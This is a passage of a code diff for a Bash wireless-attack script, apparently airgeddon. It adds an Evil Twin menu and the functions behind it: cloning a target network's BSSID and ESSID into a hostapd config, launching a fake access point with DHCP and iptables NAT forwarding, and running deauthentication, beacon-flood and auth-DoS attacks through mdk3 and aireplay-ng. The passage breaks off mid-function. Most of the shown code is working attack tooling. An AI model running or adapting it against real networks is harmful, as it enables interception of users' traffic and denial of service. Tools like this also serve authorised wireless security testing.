+	arr["french",285]="Une interface avec accès à internet a déjà été sélectionné pour cette session ["${normal_color}"$internet_inferface"${blue_color}"]"
+	arr["catalan",285]="S'ha detectat que ja té una interfície amb accés a internet seleccionada en aquesta sessió ["${normal_color}"$internet_inferface"${blue_color}"]"
+	arr["portuguese",285]="$pending_of_translation Verificou-se já que tem uma interface com acesso à internet seleccionado nesta sessão ["${normal_color}"$internet_inferface"${blue_color}"]"
+
+	arr["english",286]="The unique Evil Twin attack in which it's not necessary to have an additional interface with internet access is the captive portal attack"
+	arr["spanish",286]="El único ataque de Evil Twin en el que no es necesario tener una interfaz adicional con acceso a internet es el del portal cautivo"
+	arr["french",286]="La seule attaque Evil Twin pour laquelle il n'est pas nécessaire d'avoir une interface supplémentaire avec accès à internet est l'attaque portail captif"
+	arr["catalan",286]="L'únic atac d'Evil Twin en què no cal tenir una interfície addicional amb accés a internet és el del portal captiu"
+	arr["portuguese",286]="$pending_of_translation O único ataque Evil Twin em que não é necessário ter uma interface adicional com acesso à internet é o portal cativo"
+
+	arr["english",287]="The script will check for internet access. Please be patient..."
+	arr["spanish",287]="El script va a comprobar si tienes acceso a internet. Por favor ten paciencia..."
+	arr["french",287]="Le script va vérifier que vous aillez accès à internet. Soyez patients s'il vous plaît..."
+	arr["catalan",287]="El script comprovarà si tens accés a internet. Si us plau sigues pacient..."
+	arr["portuguese",287]="$pending_of_translation O script irá verificar se você tem acesso à internet. Por favor, seja paciente..."
+
+	arr["english",288]="It seems you have no internet access. This attack needs an interface with internet access"
+	arr["spanish",288]="Parece que no tienes conexión a internet. Este ataque necesita una interfaz con acceso a internet"
+	arr["french",288]="Il semble que vous ne pouvez pas vous connecter à internet. Cette attaque a besoin d'une interface avec u accès internet"
+	arr["catalan",288]="Sembla que no tens connexió a internet. Aquest atac necessita una interfície amb accés a internet"
+	arr["portuguese",288]="$pending_of_translation Parece que você não tem acesso à internet. Este ataque precisa de uma interface com acesso à internet"
+
+	arr["english",289]="It has been verified successfully you have internet access on selected interface. Script can continue..."
+	arr["spanish",289]="Se ha verificado correctamente que tienes acceso a internet en la interfaz seleccionada. El script puede continuar..."
+	arr["french",289]="Confirmation de l'accès internet pour l'interface réseaux choisie. Le script peut continuer..."
+	arr["catalan",289]="S'ha verificat correctament que tens accés a internet a la interfície seleccionada. El script pot continuar..."
+	arr["portuguese",289]="$pending_of_translation Verificou-se com sucesso que você tem acesso à internet na interface selecionada. O script pode continuar..."
+
+	arr["english",290]="It seems you have internet access but not in the selected interface acting as interface with internet access"
+	arr["spanish",290]="Parece que tienes conexión a internet pero no en la interfaz seleccionada como interfaz con acceso a internet"
+	arr["french",290]="Il semble bien que vous avez accès à internet mais pas avec l'interface sélectionnée à cet effet"
+	arr["catalan",290]="Sembla que tens connexió a internet però no en la interfície seleccionada com a interfície amb accés a internet"
+	arr["portuguese",290]="$pending_of_translation Parece que você tem internet, mas não na interface selecionada como uma interface com acesso à internet"
+
+	arr["english",291]="Evil Twin AP attack with sniffing"
+	arr["spanish",291]="Ataque Evil Twin AP con sniffing"
+	arr["french",291]="Attaque Evil Twin avec capture de données"
+	arr["catalan",291]="Atac Evil Twin AP amb sniffing"
+	arr["portuguese",291]="$pending_of_translation Ataque Evil Twin AP com sniffing"
+
+	arr["english",292]="Evil Twin AP attack with sniffing and sslstrip"
+	arr["spanish",292]="Ataque Evil Twin AP con sniffing y sslstrip"
+	arr["french",292]="Attaque Evil Twin avec capture de données et sslstrip"
+	arr["catalan",292]="Atac Evil Twin AP amb sniffing i sslstrip"
+	arr["portuguese",292]="$pending_of_translation Ataque Evil Twin AP com sniffing e sslstrip"
+
+	arr["english",293]="Evil Twin AP attack with captive portal"
+	arr["spanish",293]="Ataque Evil Twin AP con portal cautivo"
+	arr["french",293]="Attaque Evil Twin avec portail captif"
+	arr["catalan",293]="Atac Evil Twin AP amb portal captiu"
+	arr["portuguese",293]="$pending_of_translation Ataque Evil Twin AP com portal cativo"
+
 	arr["english",294]="Detecting resolution... Detected! : "${normal_color}"$resolution"
 	arr["spanish",294]="Detectando resolución... Detectada! : "${normal_color}"$resolution"
-	arr["french",294]="$pending_of_translation Détection du résolution... Détectée! : "${normal_color}"$resolution"
-	arr["catalan",294]="$pending_of_translation Detecció resolució... Detectada! : "${normal_color}"$resolution"
+	arr["french",294]="Détection de la résolution... Détectée! : "${normal_color}"$resolution"
+	arr["catalan",294]="Detectant resolució... Detectada! : "${normal_color}"$resolution"
 	arr["portuguese",294]="$pending_of_translation Detecção de resolução... Detectada! : "${normal_color}"$resolution"
 
 	arr["english",295]="Detecting resolution... Can't be detected!, using standard : "${normal_color}"$resolution"
 	arr["spanish",295]="Detectando resolución... No se ha podido detectar!, usando estándar : "${normal_color}"$resolution"
-	arr["french",295]="$pending_of_translation Détection du résolution... Impossible de détecter!, en utilisant la norme : "${normal_color}"$resolution"
-	arr["catalan",295]="$pending_of_translation Detecció resolució... No s'ha pogut detectar!, usant estàndard : "${normal_color}"$resolution"
+	arr["french",295]="Détection de la résolution... Impossible à détecter!, utilisation de la résolution : "${normal_color}"$resolution"
+	arr["catalan",295]="Detectant resolució... No s'ha pogut detectar!, usant estàndard : "${normal_color}"$resolution"
 	arr["portuguese",295]="$pending_of_translation Detectando resolução... Não foi possível detectar!, usando o padrão : "${normal_color}"$resolution"
+
+	arr["english",296]="All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press Enter on this window and the script will automatically close them all"
+	arr["spanish",296]="Todos los parámetros y requerimientos están listos. Va a comenzar el ataque. Se abrirán múltiples ventanas, no cierres ninguna. Cuando quieras parar el ataque pulsa Enter en esta ventana y el script cerrará automaticamente todo"
+	arr["french",296]="Tous les paramètres de l'attaque sont prêts et elle peut comenmcer. Plusieurs consoles vont s'ouvrir, ne les fermez pas. Lorsque vous voulez arrêter l'attaque, appuyez sur Entrée dans cette console et le script fermera automatiquement les autres"
+	arr["catalan",296]="Tots els paràmetres i requeriments estan preparats. Començarà l'atac. S'obriran múltiples finestres, no tanquis cap. Quan vulguis parar l'atac prem Enter en aquesta finestra i el script tancarà automàticament tot"
+	arr["portuguese",296]="$pending_of_translation Todos os parâmetros e requisitos estão prontos. Você vai começar o ataque. várias janelas, não fechar qualquer aberto. Quando quiser parar o ataque pressione Enter nesta janela eo script irá fechar automaticamente todos"
+
+	arr["english",297]="Cleaning iptables and routing rules"
+	arr["spanish",297]="Limpiando iptables y reglas de routing"
+	arr["french",297]="Effacement des règles de routage iptables"
+	arr["catalan",297]="Netejant iptables i regles de routing"
+	arr["portuguese",297]="$pending_of_translation Limpar iptables e regras de roteamento"
+
+	arr["english",298]="Evil Twin attack has been started. Press Enter key on this window to stop it"
+	arr["spanish",298]="El ataque Evil Twin ha comenzado. Pulse la tecla Enter en esta ventana para pararlo"
+	arr["french",298]="L'attaque Evil Twin a commencé. Pressez la touche Entrée dans cette console pour l'arrêter"
+	arr["catalan",298]="L'atac Evil Twin ha començat. Prem Enter a aquesta finestra per aturar-lo"
+	arr["portuguese",298]="$pending_of_translation Evil Twin ataque começou. Pressione a tecla Enter nesta janela para parar"
+
+	arr["english",299]="Restoring interface..."
+	arr["spanish",299]="Restaurando interfaz..."
+	arr["french",299]="Réinitialisation de l'interface..."
+	arr["catalan",299]="Restablint interfície..."
+	arr["portuguese",299]="$pending_of_translation Interface de restauração..."
 
 	case "$3" in
 		"yellow")
@@ -1704,6 +2068,9 @@ function language_strings() {
 		;;
 		"separator")
 			generate_dynamic_line "${arr[$1,$2]}" "separator"
+		;;
+		"under_construction")
+			echo_red_slim "${arr[$1,$2]} ($under_constructionvar)"
 		;;
 		*)
 			if [ -z "$3" ]; then
@@ -1778,7 +2145,6 @@ function generate_dynamic_line() {
 
 	if [ "$type" = "title" ]; then
 		finaltitle="$finaltitle $titletext "
-
 	elif [ "$type" = "separator" ]; then
 		finaltitle="$finaltitle ($titletext) "
 	fi
@@ -1793,7 +2159,6 @@ function generate_dynamic_line() {
 
 	if [ "$type" = "title" ]; then
 		echo_red "$finaltitle"
-
 	elif [ "$type" = "separator" ]; then
 		echo_blue "$finaltitle"
 	fi
@@ -1850,6 +2215,69 @@ function check_monitor_enabled() {
 		return 1
 	fi
 	return 0
+}
+
+function check_interface_wifi() {
+
+	execute_iwconfig_fix
+	return $?
+}
+
+function execute_iwconfig_fix() {
+
+	iwconfig_fix
+	iwcmd="iwconfig $interface $iwcmdfix > /dev/null 2> /dev/null"
+	eval ${iwcmd}
+
+	return $?
+}
+
+function prepare_et_monitor() {
+
+	disable_rfkill
+
+	phy_iface=$(ls -l "/sys/class/net/$interface/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/' 2> /dev/null)
+	iface_phy_number=${phy_iface:3:1}
+	iface_monitor_et_deauth="mon$iface_phy_number"
+
+	iw phy ${phy_iface} interface add ${iface_monitor_et_deauth} type monitor 2> /dev/null
+	ifconfig ${iface_monitor_et_deauth} up > /dev/null 2>&1
+	iwconfig ${iface_monitor_et_deauth} channel ${channel} > /dev/null 2>&1
+}
+
+function prepare_et_interface() {
+
+	et_initial_state=${ifacemode}
+
+	if [ ${ifacemode} != "Managed" ]; then
+		new_interface=$(${airmon} stop ${interface} 2> /dev/null | grep station)
+		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+		if [ "$interface" != "$new_interface" ]; then
+			interface=${new_interface}
+		fi
+	fi
+}
+
+function restore_et_interface() {
+
+	echo
+	language_strings ${language} 299 "blue"
+
+	disable_rfkill
+
+	iw dev ${iface_monitor_et_deauth} del > /dev/null 2>&1
+
+	if [ ${et_initial_state} = "Managed" ]; then
+		ifconfig ${interface} down > /dev/null 2>&1
+		iwconfig ${interface} mode managed > /dev/null 2>&1
+		ifconfig ${interface} up > /dev/null 2>&1
+	else
+		new_interface=$(${airmon} start ${interface} 2> /dev/null | grep monitor)
+		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+		if [ "$interface" != "$new_interface" ]; then
+			interface=${new_interface}
+		fi
+	fi
 }
 
 function disable_rfkill() {
@@ -1911,6 +2339,7 @@ function monitor_option() {
 	if [ ${check_kill_needed} -eq 1 ]; then
 		language_strings ${language} 19 "blue"
 		${airmon} check kill > /dev/null 2>&1
+		nm_processes_killed=1
 	fi
 
 	new_interface=$(${airmon} start ${interface} 2> /dev/null | grep monitor)
@@ -1929,9 +2358,7 @@ function monitor_option() {
 
 function check_interface_mode() {
 
-	iwconfig_fix
-	iwcmd="iwconfig $interface $iwcmdfix > /dev/null 2> /dev/null"
-	eval ${iwcmd}
+	execute_iwconfig_fix
 	if [[ "$?" != "0" ]]; then
 		ifacemode="(Non wifi card)"
 		return 0
@@ -2072,6 +2499,79 @@ function set_chipset() {
 	fi
 }
 
+function select_internet_interface() {
+
+	if [ ${return_to_et_main_menu} -eq 1 ]; then
+		return
+	fi
+
+	current_menu="evil_twin_attacks_menu"
+	clear
+	case ${et_mode} in
+		"et_onlyap")
+			language_strings ${language} 270 "title"
+		;;
+		"et_sniffing")
+			language_strings ${language} 291 "title"
+		;;
+		"et_sniffing_sslstrip")
+			language_strings ${language} 292 "title"
+		;;
+	esac
+
+	inet_ifaces=`ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk {'print $1'} | grep lo -v | grep ${interface} -v`
+
+	option_counter=0
+	for item in ${inet_ifaces}; do
+
+		if [ ${option_counter} -eq 0 ]; then
+			language_strings ${language} 279 "green"
+			print_simple_separator
+		fi
+
+		option_counter=$[option_counter + 1]
+		if [ ${#option_counter} -eq 1 ]; then
+			spaceiface="  "
+		else
+			spaceiface=" "
+		fi
+		set_chipset ${item}
+		echo -ne "$option_counter.$spaceiface$item "
+		if [ "$chipset" = "" ]; then
+			language_strings ${language} 245 "blue"
+		else
+			echo -e ${blue_color}"// "${yellow_color}"Chipset:"${normal_color}" $chipset"
+		fi
+	done
+
+	if [ ${option_counter} -eq 0 ]; then
+		return_to_et_main_menu=1
+		echo
+		language_strings ${language} 280 "yellow"
+		language_strings ${language} 115 "read"
+		return
+	fi
+
+	print_hint ${current_menu}
+
+	read inet_iface
+	if [ -z ${inet_iface} ]; then
+		invalid_internet_iface_selected
+		else if [[ ${inet_iface} < 1 ]] || [[ ${inet_iface} > ${option_counter} ]]; then
+			invalid_internet_iface_selected
+		else
+			option_counter2=0
+			for item2 in ${inet_ifaces}; do
+				option_counter2=$[option_counter2 + 1]
+				if [[ "$inet_iface" = "$option_counter2" ]]; then
+					internet_interface=${item2}
+					break;
+				fi
+			done
+		fi
+	fi
+}
+
 function select_interface() {
 
 	clear
@@ -2151,7 +2651,7 @@ function ask_channel() {
 		read_channel
 	done
 	echo
-	language_strings ${language} 26 "yellow"
+	language_strings ${language} 26 "blue"
 }
 
 function read_bssid() {
@@ -2167,7 +2667,7 @@ function ask_bssid() {
 		read_bssid
 	done
 	echo
-	language_strings ${language} 28 "yellow"
+	language_strings ${language} 28 "blue"
 }
 
 function read_essid() {
@@ -2189,7 +2689,7 @@ function ask_essid() {
 	fi
 
 	echo
-	language_strings ${language} 31 "yellow"
+	language_strings ${language} 31 "blue"
 }
 
 function exec_mdk3deauth() {
@@ -2205,7 +2705,8 @@ function exec_mdk3deauth() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel}
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1
 }
 
 function exec_aireplaydeauth() {
@@ -2219,7 +2720,8 @@ function exec_aireplaydeauth() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1
 }
 
 function exec_wdsconfusion() {
@@ -2231,7 +2733,8 @@ function exec_wdsconfusion() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel}
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1
 }
 
 function exec_beaconflood() {
@@ -2243,7 +2746,8 @@ function exec_beaconflood() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h > /dev/null 2>&1
 }
 
 function exec_authdos() {
@@ -2255,7 +2759,8 @@ function exec_authdos() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024 > /dev/null 2>&1
 }
 
 function exec_michaelshutdown() {
@@ -2267,7 +2772,8 @@ function exec_michaelshutdown() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024 > /dev/null 2>&1
 }
 
 function mdk3_deauth_option() {
@@ -2395,6 +2901,17 @@ function print_iface_selected() {
 	fi
 }
 
+function print_iface_internet_selected() {
+
+	if [ "$et_mode" != "et_captive_portal" ]; then
+		if [ -z "$internet_interface" ]; then
+			language_strings ${language} 283 "blue"
+		else
+			language_strings ${language} 282 "blue"
+		fi
+	fi
+}
+
 function print_all_target_vars() {
 
 	if [ -n "$bssid" ]; then
@@ -2413,6 +2930,65 @@ function print_all_target_vars() {
 			language_strings ${language} 135 "blue"
 		fi
 	fi
+}
+
+function print_all_target_vars_et() {
+
+	if [ -n "$bssid" ]; then
+		language_strings ${language} 43 "blue"
+	else
+		language_strings ${language} 271 "blue"
+	fi
+
+	if [ -n "$channel" ]; then
+		language_strings ${language} 44 "blue"
+	else
+		language_strings ${language} 273 "blue"
+	fi
+
+	if [ -n "$essid" ]; then
+		if [ "$essid" = "(Hidden Network)" ]; then
+			language_strings ${language} 45 "blue"
+		else
+			language_strings ${language} 46 "blue"
+		fi
+	else
+		language_strings ${language} 274 "blue"
+	fi
+}
+
+function print_et_target_vars() {
+
+	if [ -n "$bssid" ]; then
+		language_strings ${language} 43 "blue"
+	else
+		language_strings ${language} 271 "blue"
+	fi
+
+	if [ -n "$channel" ]; then
+		language_strings ${language} 44 "blue"
+	else
+		language_strings ${language} 273 "blue"
+	fi
+
+	if [ -n "$essid" ]; then
+		if [ "$essid" = "(Hidden Network)" ]; then
+			language_strings ${language} 45 "blue"
+		else
+			language_strings ${language} 46 "blue"
+		fi
+	else
+		language_strings ${language} 274 "blue"
+	fi
+
+	if [ "$current_menu" != "et_dos_menu" ]; then
+		if [ -n "$et_dos_attack" ]; then
+			language_strings ${language} 272 "blue"
+		else
+			language_strings ${language} 278 "blue"
+		fi
+	fi
+
 }
 
 function print_decrypt_vars() {
@@ -2445,6 +3021,7 @@ function initialize_menu_options_dependencies() {
 	aireplay_attack_dependencies=(${optional_tools_names[2]})
 	mdk3_attack_dependencies=(${optional_tools_names[3]})
 	hashcat_attacks_dependencies=(${optional_tools_names[4]})
+	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
 }
 
 function initialize_menu_and_print_selections() {
@@ -2473,6 +3050,20 @@ function initialize_menu_and_print_selections() {
 		"language_menu")
 			print_iface_selected
 		;;
+		"evil_twin_attacks_menu")
+			return_to_et_main_menu=0
+			dhcpd_path_changed=0
+			et_mode=""
+			et_processes=()
+			print_iface_selected
+			print_all_target_vars_et
+			print_iface_internet_selected
+		;;
+		"et_dos_menu")
+			print_iface_selected
+			print_et_target_vars
+			print_iface_internet_selected
+		;;
 		*)
 			print_iface_selected
 			print_all_target_vars
@@ -2485,9 +3076,24 @@ function clean_tmpfiles() {
 	rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
 	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
-	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
+	rm -rf ${tmpdir}"clts"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"wnws.txt" > /dev/null 2>&1
 	rm -rf ${tmpdir}"hctmp"* > /dev/null 2>&1
+	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1
+	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
+	rm -rf "$tmpdir$control_file" > /dev/null 2>&1
+	if [ ${dhcpd_path_changed} -eq 1 ]; then
+		rm -rf "$dhcp_path" > /dev/null 2>&1
+	fi
+}
+
+function clean_routing_rules() {
+
+	echo "0" > /proc/sys/net/ipv4/ip_forward
+	iptables -F
+	iptables -t nat -F
+	iptables -X
+	iptables -t nat -X
 }
 
 function store_array() {
@@ -2559,6 +3165,20 @@ function print_hint() {
 			randomhint=$(shuf -i 0-${hintlength} -n 1)
 			strtoprint=${hints[language_hints|$randomhint]}
 		;;
+		"evil_twin_attacks_menu")
+			store_array hints evil_twin_hints "${evil_twin_hints[@]}"
+			hintlength=${#evil_twin_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-${hintlength} -n 1)
+			strtoprint=${hints[evil_twin_hints|$randomhint]}
+		;;
+		"et_dos_menu")
+			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
+			hintlength=${#evil_twin_dos_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-${hintlength} -n 1)
+			strtoprint=${hints[evil_twin_dos_hints|$randomhint]}
+		;;
 	esac
 
 	print_simple_separator
@@ -2582,6 +3202,7 @@ function main_menu() {
 	language_strings ${language} 118
 	language_strings ${language} 119
 	language_strings ${language} 169
+	language_strings ${language} 252
 	print_simple_separator
 	language_strings ${language} 60
 	language_strings ${language} 78
@@ -2609,12 +3230,15 @@ function main_menu() {
 			decrypt_menu
 		;;
 		7)
-			credits_option
+			evil_twin_attacks_menu
 		;;
 		8)
-			language_menu
+			credits_option
 		;;
 		9)
+			language_menu
+		;;
+		10)
 			exit_script_option
 		;;
 		*)
@@ -2623,6 +3247,125 @@ function main_menu() {
 	esac
 
 	main_menu
+}
+
+function evil_twin_attacks_menu() {
+
+	clear
+	language_strings ${language} 253 "title"
+	current_menu="evil_twin_attacks_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings ${language} 47 "green"
+	print_simple_separator
+	language_strings ${language} 48
+	language_strings ${language} 55
+	language_strings ${language} 56
+	language_strings ${language} 49
+	language_strings ${language} 255 "separator"
+	language_strings ${language} 256 et_onlyap_dependencies[@]
+	language_strings ${language} 257 "separator"
+	language_strings ${language} 259 "under_construction"
+	language_strings ${language} 261 "under_construction"
+	language_strings ${language} 262 "separator"
+	language_strings ${language} 263 "under_construction"
+	print_simple_separator
+	language_strings ${language} 260
+	print_hint ${current_menu}
+
+	read et_option
+	case ${et_option} in
+		1)
+			select_interface
+		;;
+		2)
+			monitor_option
+		;;
+		3)
+			managed_option
+		;;
+		4)
+			explore_for_targets_option
+		;;
+		5)
+			contains_element "$et_option" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				check_interface_wifi
+				if [ "$?" = "0" ]; then
+					et_mode="et_onlyap"
+					et_dos_menu
+				else
+					echo
+					language_strings ${language} 281 "yellow"
+					language_strings ${language} 115 "read"
+				fi
+			fi
+		;;
+		6)
+			under_construction_message
+			#TODO: Evil Twin AP with sniffing
+			#contains_element "$et_option" "${forbidden_options[@]}"
+			#if [ "$?" = "0" ]; then
+			#	forbidden_menu_option
+			#else
+			#	check_interface_wifi
+			#	if [ "$?" = "0" ]; then
+			#		et_mode="et_sniffing"
+			#		et_dos_menu
+			#	else
+			#		echo
+			#		language_strings ${language} 281 "yellow"
+			#		language_strings ${language} 115 "read"
+			#	fi
+			#fi
+		;;
+		7)
+			under_construction_message
+			#TODO: Evil Twin AP with sniffing and sslstrip
+			#contains_element "$et_option" "${forbidden_options[@]}"
+			#if [ "$?" = "0" ]; then
+			#	forbidden_menu_option
+			#else
+			#	check_interface_wifi
+			#	if [ "$?" = "0" ]; then
+			#		et_mode="et_sniffing_sslstrip"
+			#		et_dos_menu
+			#	else
+			#		echo
+			#		language_strings ${language} 281 "yellow"
+			#		language_strings ${language} 115 "read"
+			#	fi
+			#fi
+		;;
+		8)
+			under_construction_message
+			#TODO: Evil Twin AP with captive portal
+			#contains_element "$et_option" "${forbidden_options[@]}"
+			#if [ "$?" = "0" ]; then
+			#	forbidden_menu_option
+			#else
+			#	check_interface_wifi
+			#	if [ "$?" = "0" ]; then
+			#		et_mode="et_captive_portal"
+			#		et_dos_menu
+			#	else
+			#		echo
+			#		language_strings ${language} 281 "yellow"
+			#		language_strings ${language} 115 "read"
+			#	fi
+			#fi
+		;;
+		9)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	evil_twin_attacks_menu
 }
 
 function decrypt_menu() {
@@ -3184,6 +3927,302 @@ function exec_hashcat_rulebased_attack() {
 	language_strings ${language} 115 "read"
 }
 
+function exec_et_onlyap_attack() {
+
+	set_hostapd_config
+	launch_fake_ap
+	set_dhcp_config
+	set_std_internet_routing_rules
+	launch_dhcp_server
+	exec_et_deauth
+	set_control_script
+	launch_control_window
+
+	echo
+	language_strings ${language} 298 "yellow"
+	language_strings ${language} 115 "read"
+
+	kill_et_windows
+	restore_et_interface
+}
+
+function set_hostapd_config() {
+
+	tmpfiles_toclean=1
+	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1
+
+	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n100 | grep -v "${bssid:10:1}" | head -c 1)
+	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
+
+	echo -e "interface=$interface" > "$tmpdir$hostapd_file"
+	echo -e "driver=nl80211" >> "$tmpdir$hostapd_file"
+	echo -e "ssid=$essid" >> "$tmpdir$hostapd_file"
+	echo -e "channel=$channel" >> "$tmpdir$hostapd_file"
+	echo -e "bssid=$et_bssid" >> "$tmpdir$hostapd_file"
+}
+
+function launch_fake_ap() {
+
+	killall hostapd > /dev/null 2>&1
+	${airmon} check kill > /dev/null 2>&1
+	nm_processes_killed=1
+
+	case ${et_mode} in
+		"et_onlyap")
+			hostapd_scr_window_position=${g1_topleft_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			hostapd_scr_window_position=${g3_topleft_window}
+		;;
+	esac
+	apply_screen_correction ${hostapd_scr_window_position}
+	xterm -hold -bg black -fg blue -geometry ${scrdata_corrected} -T "AP" -e "hostapd \"$tmpdir$hostapd_file\"" > /dev/null 2>&1 &
+	et_processes+=($!)
+	sleep 3
+}
+
+function set_dhcp_config() {
+
+	route | grep ${ip_range} > /dev/null
+	if [ "$?" != "0" ]; then
+		et_ip_range=${ip_range}
+		et_ip_router=${router_ip}
+		et_broadcast_ip=${broadcast_ip}
+		et_range_start=${range_start}
+		et_range_stop=${range_stop}
+	else
+		et_ip_range=${alt_ip_range}
+		et_ip_router=${alt_router_ip}
+		et_broadcast_ip=${alt_broadcast_ip}
+		et_range_start=${alt_range_start}
+		et_range_stop=${alt_range_stop}
+	fi
+
+	tmpfiles_toclean=1
+	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
+	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
+	ifconfig ${interface} up
+
+	echo -e "authoritative;" > "$tmpdir$dhcpd_file"
+	echo -e "default-lease-time 600;" >> "$tmpdir$dhcpd_file"
+	echo -e "max-lease-time 7200;" >> "$tmpdir$dhcpd_file"
+	echo -e "subnet $et_ip_range netmask $std_c_mask {" >> "$tmpdir$dhcpd_file"
+	echo -e "\toption broadcast-address $et_broadcast_ip;" >> "$tmpdir$dhcpd_file"
+	echo -e "\toption routers $et_ip_router;" >> "$tmpdir$dhcpd_file"
+	echo -e "\toption subnet-mask $std_c_mask;" >> "$tmpdir$dhcpd_file"
+	echo -e "\toption domain-name-servers $dns1, $dns2;" >> "$tmpdir$dhcpd_file"
+	echo -e "\trange $et_range_start $et_range_stop;" >> "$tmpdir$dhcpd_file"
+	echo -e "}" >> "$tmpdir$dhcpd_file"
+
+	leases_found=0
+	for item in ${!possible_dhcp_leases_files[@]}; do
+		if [ -f "${possible_dhcp_leases_files[$item]}" ]; then
+			leases_found=1
+			key_leases_found=${item}
+			break
+		fi
+	done
+
+	if [ ${leases_found} -eq 1 ]; then
+		echo -e "lease-file-name \"${possible_dhcp_leases_files[$key_leases_found]}\";" >> "$tmpdir$dhcpd_file"
+		chmod a+w "${possible_dhcp_leases_files[$key_leases_found]}" > /dev/null 2>&1
+	else
+		touch "${possible_dhcp_leases_files[0]}"
+		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "$tmpdir$dhcpd_file"
+		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
+	fi
+
+	dhcp_path="$tmpdir$dhcpd_file"
+	if hash apparmor_status 2> /dev/null; then
+		apparmor_status | grep dhcpd > /dev/null
+		if [ "$?" = "0" ]; then
+			if [ -d /etc/dhcpd ]; then
+				cp "$tmpdir$dhcpd_file" /etc/dhcpd/ 2> /dev/null
+				dhcp_path="/etc/dhcpd/$dhcpd_file"
+			elif [ -d /etc/dhcp ]; then
+				cp "$tmpdir$dhcpd_file" /etc/dhcp/ 2> /dev/null
+				dhcp_path="/etc/dhcp/$dhcpd_file"
+			else
+				cp "$tmpdir$dhcpd_file" /etc/ 2> /dev/null
+				dhcp_path="/etc/$dhcpd_file"
+			fi
+			dhcpd_path_changed=1
+		fi
+	fi
+}
+
+function set_std_internet_routing_rules() {
+
+	routing_toclean=1
+	ifconfig ${interface} ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
+	echo "1" > /proc/sys/net/ipv4/ip_forward
+
+	iptables -F
+	iptables -t nat -F
+	iptables -P FORWARD ACCEPT
+	iptables -t nat -A POSTROUTING -j MASQUERADE
+	iptables -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
